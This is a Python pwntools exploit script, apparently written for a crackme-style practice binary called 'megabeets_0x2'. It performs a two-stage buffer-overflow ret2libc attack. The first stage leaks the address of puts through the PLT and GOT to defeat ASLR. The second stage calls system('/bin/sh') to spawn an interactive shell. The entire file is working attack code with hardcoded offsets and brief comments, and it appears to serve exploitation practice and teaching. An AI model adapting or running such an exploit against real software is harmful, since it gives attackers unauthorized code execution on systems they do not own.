#!/usr/bin/python2.7

from pwn import *

p = process("./megabeets_0x2")

# EIP overwrite has happened after 200 bytes
# --> limit the paylaod to this size
TOTALSIZE = 200
offset_eip = 140

# We leak the address of puts
# --> leak - offset_puts = start of libc
offset_puts = 0x00069930
# Using the start address of libc we can
# calculate the address of the function that are
# required to spawn a shell
offset_system = 0x0003e8f0
offset_libc = 0x000318e0
offset_shell = 0x17faaa
offset_exit = 0x000318e0

# $ afl
# 0x08048390    1 6            sym.imp.puts
# address of the puts stub in the PLT
puts_plt = 0x08048390
# $ ir
# vaddr=0x0804a014 paddr=0x00001014 type=SET_32 puts
# adress of puts according to the GOT
puts_got = 0x0804a014

# $ ieq
# The entry point of the application
entry = 0x080483d0

#####

# First stage: leak the address
# of puts to bypass ASLR
HAX = ""
HAX += "A" * offset_eip # EIP
# Call puts@plt(puts@got)
# with return adress = entry point
# of the application
chain =  p32(puts_plt)
chain +=  p32(entry)
chain += p32(puts_got)

HAX += chain

p.clean()
p.sendline(HAX)

# Read the leaked address
leak = p.recv(4)
leak = u32(leak)
log.info("puts is at: 0x%x" % leak)

p.clean()

# Calculate the libs base address
libc_base = leak-offset_puts
log.info("libc is at: 0x%x" % libc_base)

# Second stage: Call system("/bin/sh")
HAX = ""
HAX = "A" * offset_eip
chain = p32(libc_base + offset_system)
chain += p32(libc_base + offset_exit)
chain += p32(libc_base + offset_shell)

HAX += chain

# Time to hax
p.sendline(HAX)
p.interactive()
